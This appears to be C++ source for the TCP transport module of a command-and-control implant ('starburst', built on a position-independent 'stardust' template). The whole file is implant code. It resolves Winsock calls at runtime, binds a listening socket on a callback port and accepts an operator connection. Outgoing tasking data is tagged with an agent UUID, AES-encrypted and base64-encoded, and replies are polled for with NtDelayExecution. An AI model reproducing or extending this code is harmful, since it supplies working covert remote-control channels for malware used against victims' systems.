#include <common.h>
#include <transport_tcp.h>
#include <base64.h>
#include <crypto.h>
#include <strings.h>
#include <config.h>

#if defined( TCP_TRANSPORT )

using namespace stardust;
using namespace starburst;

auto declfn starburst::tcp_init(
    _Inout_ instance& inst
) -> bool {
    auto ts = static_cast<TcpLinkState*>( inst.heap_alloc( sizeof( TcpLinkState ) ) );
    if ( !ts ) return false;
    memory::zero( ts, sizeof( TcpLinkState ) );

    if ( !tcp_resolve_ws2( inst, ts ) ) {
        inst.heap_free( ts );
        return false;
    }

    inst.tcp_link_state   = ts;
    inst.tcp_listen_sock  = TCP_INVALID_SOCKET;
    inst.tcp_client_sock  = TCP_INVALID_SOCKET;

    uintptr_t sock = ts->ws.psocket( TCP_AF_INET, TCP_SOCK_STREAM, TCP_IPPROTO_TCP );
    if ( sock == TCP_INVALID_SOCKET ) {
        DBG_PRINT( inst, "tcp_init: socket failed\n" );
        return false;
    }

    int reuse = 1;
    ts->ws.psetsockopt( sock, TCP_SOL_SOCKET, TCP_SO_REUSEADDR,
                        reinterpret_cast<const char*>( &reuse ), sizeof( reuse ) );

    tcp_sockaddr_in addr;
    memory::zero( &addr, sizeof( addr ) );
    addr.sin_family = TCP_AF_INET;
    addr.sin_port   = ts->ws.phtons( inst.transport.callback_port );
    addr.sin_addr   = 0;

    if ( ts->ws.pbind( sock, &addr, sizeof( addr ) ) == TCP_SOCKET_ERROR ) {
        DBG_PRINT( inst, "tcp_init: bind failed on port %d\n", inst.transport.callback_port );
        ts->ws.pclosesocket( sock );
        return false;
    }

    if ( ts->ws.plisten( sock, TCP_SOMAXCONN ) == TCP_SOCKET_ERROR ) {
        DBG_PRINT( inst, "tcp_init: listen failed\n" );
        ts->ws.pclosesocket( sock );
        return false;
    }

    inst.tcp_listen_sock = sock;

    DBG_PRINT( inst, "tcp_init: listening on port %d\n", inst.transport.callback_port );

    tcp_sockaddr_in client_addr;
    int client_len = sizeof( client_addr );
    inst.tcp_client_sock = ts->ws.paccept( inst.tcp_listen_sock, &client_addr, &client_len );

    if ( inst.tcp_client_sock == TCP_INVALID_SOCKET ) {
        DBG_PRINT( inst, "tcp_init: accept failed\n" );
        ts->ws.pclosesocket( inst.tcp_listen_sock );
        inst.tcp_listen_sock = TCP_INVALID_SOCKET;
        return false;
    }

    DBG_PRINT( inst, "tcp_init: client connected\n" );
    inst.tcp_links = nullptr;

    return true;
}

auto declfn starburst::tcp_send(
    _Inout_ instance& inst,
    _In_    uint8_t*  data,
    _In_    uint32_t  len,
    _Out_   uint8_t** response,
    _Out_   uint32_t* resp_len
) -> bool {
    *response = nullptr;
    *resp_len = 0;

    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );
    if ( !ts || inst.tcp_client_sock == TCP_INVALID_SOCKET ) return false;

    uint8_t* encrypted = nullptr;
    uint32_t enc_len = 0;
    if ( !crypto_encrypt( inst, inst.agent.aes_key, data, len, &encrypted, &enc_len ) ) {
        return false;
    }

    uint32_t uuid_len = str_len( inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid );
    uint32_t raw_len  = uuid_len + enc_len;
    auto raw = static_cast<uint8_t*>( inst.heap_alloc( raw_len ) );
    if ( !raw ) { inst.heap_free( encrypted ); return false; }

    memory::copy( raw, inst.agent.checked_in ? inst.agent.uuid : inst.agent.payload_uuid, uuid_len );
    memory::copy( raw + uuid_len, encrypted, enc_len );
    inst.heap_free( encrypted );

    uint32_t b64_len = 0;
    auto b64_data = base64_encode( inst, raw, raw_len, &b64_len );
    inst.heap_free( raw );
    if ( !b64_data ) return false;

    if ( !tcp_link_send( inst, ts, inst.tcp_client_sock, b64_data, b64_len ) ) {
        inst.heap_free( b64_data );
        return false;
    }
    inst.heap_free( b64_data );

    uint8_t* recv_buf = nullptr;
    uint32_t recv_len = 0;

    for ( int attempt = 0; attempt < 3000; attempt++ ) {
        if ( tcp_link_recv( inst, ts, inst.tcp_client_sock, &recv_buf, &recv_len ) ) break;
        LARGE_INTEGER delay;
        delay.QuadPart = -100000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
    }

    if ( !recv_buf || recv_len == 0 ) return false;

    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, recv_buf, recv_len, &decoded_len );
    inst.heap_free( recv_buf );

    if ( !decoded || decoded_len < 36 ) {
        if ( decoded ) inst.heap_free( decoded );
        return false;
    }

    uint8_t* cipher_data = decoded + 36;
    uint32_t cipher_len  = decoded_len - 36;

    uint8_t* plain = nullptr;
    uint32_t plain_len = 0;
    if ( !crypto_decrypt( inst, inst.agent.aes_key, cipher_data, cipher_len, &plain, &plain_len ) ) {
        inst.heap_free( decoded );
        return false;
    }

    inst.heap_free( decoded );

    *response = plain;
    *resp_len = plain_len;
    return true;
}

auto declfn starburst::tcp_destroy(
    _Inout_ instance& inst
) -> void {
    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );
    if ( !ts ) return;

    auto link = inst.tcp_links;
    while ( link ) {
        auto next = link->next;
        if ( link->socket != TCP_INVALID_SOCKET ) {
            ts->ws.pclosesocket( link->socket );
        }
        if ( link->agent_id ) inst.heap_free( link->agent_id );
        if ( link->hostname ) inst.heap_free( link->hostname );
        inst.heap_free( link );
        link = next;
    }
    inst.tcp_links = nullptr;

    if ( inst.tcp_client_sock != TCP_INVALID_SOCKET ) {
        ts->ws.pclosesocket( inst.tcp_client_sock );
        inst.tcp_client_sock = TCP_INVALID_SOCKET;
    }

    if ( inst.tcp_listen_sock != TCP_INVALID_SOCKET ) {
        ts->ws.pclosesocket( inst.tcp_listen_sock );
        inst.tcp_listen_sock = TCP_INVALID_SOCKET;
    }

    ts->ws.pWSACleanup();
}

#endif
